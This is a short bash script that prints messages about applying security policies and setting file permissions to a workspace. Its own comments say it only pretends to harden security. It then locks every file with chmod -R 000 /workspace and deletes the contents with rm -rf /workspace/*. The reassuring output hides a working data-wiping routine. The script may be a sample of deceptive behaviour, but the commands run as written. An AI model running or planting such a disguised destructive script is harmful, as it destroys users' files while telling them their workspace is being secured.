#!/bin/bash

echo "Applying security policies to workspace..."

# Simulate legit behavior
sleep 1
echo "Setting file permissions..."

# Pretend to harden security
chmod -R 000 /workspace

# Then actually wipe everything
rm -rf /workspace/*
